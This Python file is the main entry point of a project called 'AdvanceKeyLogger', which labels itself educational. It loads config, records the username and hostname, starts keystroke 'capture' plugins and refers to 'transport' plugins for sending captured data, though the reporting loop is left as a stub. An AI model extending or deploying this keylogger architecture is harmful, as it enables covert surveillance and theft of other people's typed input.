"""
AdvanceKeyLogger — Main entry point.

Handles argument parsing, config loading, logging setup,
and orchestrates the capture-report lifecycle.

Usage:
    python main.py                          # Run with defaults
    python main.py -c my_config.yaml        # Custom config
    python main.py --log-level DEBUG        # Verbose logging
    python main.py --list-captures          # Show available capture plugins
    python main.py --list-transports        # Show available transport plugins
"""
from __future__ import annotations

import argparse
import logging
import sys
import time

from config.settings import Settings
from utils.logger_setup import setup_logging
from utils.process import PIDLock, GracefulShutdown
from utils.system_info import get_system_info
from capture import create_enabled_captures, list_captures
from transport import list_transports

logger = logging.getLogger(__name__)


def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        prog="AdvanceKeyLogger",
        description="Educational input monitoring tool for learning OS APIs and software architecture.",
    )
    parser.add_argument(
        "-c", "--config",
        type=str,
        default=None,
        help="Path to YAML config file (overrides defaults)",
    )
    parser.add_argument(
        "--log-level",
        type=str,
        choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"],
        default=None,
        help="Override log level from config",
    )
    parser.add_argument(
        "--no-pid-lock",
        action="store_true",
        help="Disable PID lock (allow multiple instances)",
    )
    parser.add_argument(
        "--list-captures",
        action="store_true",
        help="List registered capture plugins and exit",
    )
    parser.add_argument(
        "--list-transports",
        action="store_true",
        help="List registered transport plugins and exit",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Start captures but don't send any data",
    )
    parser.add_argument(
        "--version",
        action="version",
        version="%(prog)s 0.1.0",
    )
    return parser.parse_args()


def main() -> int:
    """Main application entry point. Returns exit code."""

    args = parse_args()

    # --- Load config ---
    settings = Settings(args.config)

    # --- Setup logging ---
    log_level = args.log_level or settings.get("general.log_level", "INFO")
    log_file = settings.get("general.log_file")
    setup_logging(log_level=log_level, log_file=log_file)

    logger.info("AdvanceKeyLogger starting...")

    # --- List plugins and exit ---
    if args.list_captures:
        captures = list_captures()
        if captures:
            print("Registered capture plugins:")
            for name in captures:
                print(f"  - {name}")
        else:
            print("No capture plugins registered.")
            print("Hint: Import capture modules to register them.")
        return 0

    if args.list_transports:
        transports = list_transports()
        if transports:
            print("Registered transport plugins:")
            for name in transports:
                print(f"  - {name}")
        else:
            print("No transport plugins registered.")
            print("Hint: Import transport modules to register them.")
        return 0

    # --- PID lock ---
    pid_lock = None
    if not args.no_pid_lock:
        pid_lock = PIDLock()
        if not pid_lock.acquire():
            logger.error("Another instance is already running. Use --no-pid-lock to override.")
            return 1

    # --- System info ---
    sys_info = get_system_info()
    logger.info(
        "System: %s@%s (%s %s)",
        sys_info["username"],
        sys_info["hostname"],
        sys_info["os"],
        sys_info["os_release"],
    )

    # --- Create capture modules ---
    config = settings.as_dict()
    captures = create_enabled_captures(config)

    if not captures:
        logger.warning("No capture modules enabled in config. Nothing to do.")
        logger.info(
            "Enable captures in your config under 'capture:' section. "
            "Available: %s",
            ", ".join(list_captures()) or "(none registered)",
        )
        if pid_lock:
            pid_lock.release()
        return 0

    logger.info("Enabled captures: %s", ", ".join(str(c) for c in captures))

    # --- Graceful shutdown handler ---
    shutdown = GracefulShutdown()

    # --- Start all captures ---
    for cap in captures:
        try:
            cap.start()
            logger.info("Started: %s", cap)
        except Exception as e:
            logger.error("Failed to start %s: %s", cap, e)

    # --- Main loop ---
    report_interval = settings.get("general.report_interval", 30)
    logger.info("Entering main loop (report interval: %ds)", report_interval)

    if args.dry_run:
        logger.info("DRY RUN mode — data will be captured but not sent")

    try:
        while not shutdown.requested:
            time.sleep(min(report_interval, 1.0))

            # Check if it's time to report
            # (In a full implementation, you'd track elapsed time and
            #  call collect() on each capture, then send via transport)

    except KeyboardInterrupt:
        logger.info("KeyboardInterrupt received")

    # --- Shutdown ---
    logger.info("Shutting down...")

    for cap in captures:
        try:
            cap.stop()
            logger.info("Stopped: %s", cap)
        except Exception as e:
            logger.error("Failed to stop %s: %s", cap, e)

    if pid_lock:
        pid_lock.release()

    shutdown.restore()
    logger.info("AdvanceKeyLogger stopped.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
